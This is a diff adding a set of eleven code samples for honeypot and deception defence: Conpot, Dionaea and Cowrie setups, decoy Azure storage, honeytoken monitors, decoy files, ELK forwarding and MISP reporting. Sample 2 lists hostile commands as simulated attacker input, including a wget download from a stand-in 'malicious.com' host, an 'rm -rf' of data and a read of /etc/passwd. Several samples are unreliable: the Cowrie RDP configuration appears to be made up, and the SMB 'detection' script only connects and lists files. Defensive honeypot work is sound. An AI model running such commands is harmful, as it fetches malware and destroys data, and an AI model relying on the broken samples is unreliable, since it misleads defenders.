@@ -1,0 +1,215 @@
+Code Sample 1:
+
+# Setting up a conpot honeypot
+
+	# Install Conpot
+	sudo apt update && sudo apt install -y python3-pip
+	pip3 install conpot
+	
+	# Run Conpot
+	conpot -f
+	
+	# Monitor Logs
+	tail -f /var/log/conpot.log
+
+
+
+Code Sample 2:-
+
+# Dynamic response to attacker commands
+
+	from sklearn.feature_extraction.text import TfidfVectorizer
+	from sklearn.cluster import KMeans
+	import random
+	
+	# Step 1: Define attacker commands (simulated data)
+	commands = [
+	    "wget http://malicious.com/payload",  # Command to download malware
+	    "rm -rf /important/data",            # Command to delete critical data
+	    "cat /etc/passwd",                   # Command to read sensitive files
+	    "uname -a"                           # Command to gather system information
+	]
+	
+	# Step 2: Vectorize the commands
+	vectorizer = TfidfVectorizer()
+	X = vectorizer.fit_transform(commands)
+	
+	# Step 3: Cluster commands into groups
+	kmeans = KMeans(n_clusters=2)
+	kmeans.fit(X)
+	
+	# Step 4: Simulate dynamic responses based on clusters
+	attacker_command = "wget http://malicious.com/payload"
+	response_cluster = kmeans.predict(vectorizer.transform([attacker_command]))
+	responses = [
+	    ["404 Not Found", "Access Denied"],  # Cluster 0 responses
+	    ["File Downloaded Successfully", "Download Complete"]  # Cluster 1 responses
+	]
+	print(random.choice(responses[response_cluster[0]]))
+
+
+
+Code Sample 3:
+
+# Setting up a decoy azure blob storage
+
+	from azure.storage.blob import BlobServiceClient
+	
+	# Connect to Azure Blob Storage
+	connection_string = "your_connection_string"
+	blob_service_client = BlobServiceClient.from_connection_string(connection_string)
+	
+	# Create Decoy Container
+	container_name = "decoy-container"
+	container_client = blob_service_client.create_container(container_name)
+	
+	# Log Access
+	print(f"Decoy container '{container_name}' created and monitored for access.")
+
+
+Code Sample 4:-
+
+# Install Dionaea:
+
+	sudo apt update && sudo apt install -y dionaea
+
+
+Code Sample 5:-
+
+# Monitoring decoy credentials with Python
+
+	import re
+	
+	# Log file containing authentication attempts
+	log_file = "/var/log/auth.log"
+	
+	# Decoy credentials
+	decoy_username = "fake_user"
+	decoy_password = "fake_password"
+
+	# Function to detect decoy usage
+	def monitor_decoy_credentials(log_file):
+	    with open(log_file, "r") as file:
+	        for line in file:
+	            if decoy_username in line or decoy_password in line:
+	                print(f"Alert! Decoy credentials used: {line.strip()}")
+	
+	# Run the monitoring function
+	monitor_decoy_credentials(log_file)
+
+
+Code Sample 6:-
+
+# Exposed RDP Honeypot implementation with Cowrie
+
+	# Install Cowrie honeypot
+	git clone https://github.com/cowrie/cowrie.git
+	cd cowrie
+	pip install -r requirements.txt
+	
+	# Configure Cowrie to emulate RDP
+	nano etc/cowrie.cfg
+	# Set `[rdp]` options to enable RDP logging
+	
+	# Start the honeypot
+	./start.sh
+
+
+Code Sample 7:-
+
+# Powershell code to monitor Honeypots
+
+	# Define the honeytoken user
+	$HoneyUser = "ServiceAdmin_Honey"
+	
+	# Monitor Event ID 4625 (Failed Logon Attempts)
+	Get-WinEvent -LogName Security | Where-Object {
+	    $_.Id -eq 4625 -and $_.Message -like "*$HoneyUser*"
+	} | ForEach-Object {
+	    Write-Host "Alert! Failed logon attempt for honeytoken: $($_.Message)"
+	}
+
+
+Code Sample 8:-
+
+# Python code to detect unauthorized access to SMB honeypot
+
+	from smb.SMBConnection import SMBConnection
+	
+	# Fake SMB credentials
+	username = "honeypot_user"
+	password = "decoy_password"
+	
+	# Connect to the decoy SMB server
+	conn = SMBConnection(username, password, "honeypot", "attacker", use_ntlm_v2=True)
+	conn.connect("192.168.1.100", 445)
+	
+	# Monitor access attempts
+	access_logs = conn.listPath("honeypot_share", "/")
+	for log in access_logs:
+	    print(f"Alert! Unauthorized access detected: {log.filename}")
+
+
+
+Code Sample 9:-
+
+# Python code to generate decoy files for data exfiltration
+
+	from PyPDF2 import PdfFileWriter, PdfFileReader
+	
+	# Create a decoy PDF
+	writer = PdfFileWriter()
+	writer.addBlankPage(width=210, height=297)
+	
+	with open("Decoy_File.pdf", "wb") as decoy_file:
+	    writer.write(decoy_file)
+	
+	print("Decoy file created: Decoy_File.pdf")
+
+
+
+Code Sample 10:-
+
+# Code example for log forwarding with ELK Stack:
+
+	# Filebeat configuration for forwarding honeypot logs to Elasticsearch
+	filebeat.inputs:
+	  - type: log
+	    paths:
+	      - /var/log/honeypot/*.log
+	
+	output.elasticsearch:
+	  hosts: ["http://localhost:9200"]
+	  index: "honeypot-logs"
+
+
+
+Code Sample 11:-
+
+# Python code for adding IoCs to MISP:
+
+	import requests
+	
+	misp_url = "https://misp-instance"
+	api_key = "YOUR_API_KEY"
+	
+	ioc = {
+	    "type": "ip-dst",
+	    "category": "Network activity",
+	    "value": "192.168.1.200",
+	    "comment": "Malicious IP detected via honeytoken interaction"
+	}
+	
+	response = requests.post(
+	    f"{misp_url}/attributes/add",
+	    headers={"Authorization": api_key},
+	    json=ioc
+	)
+	
+	if response.status_code == 200:
+	    print("IoC added to MISP successfully.")
+	else:
+	    print(f"Error: {response.status_code}")
+
+
+
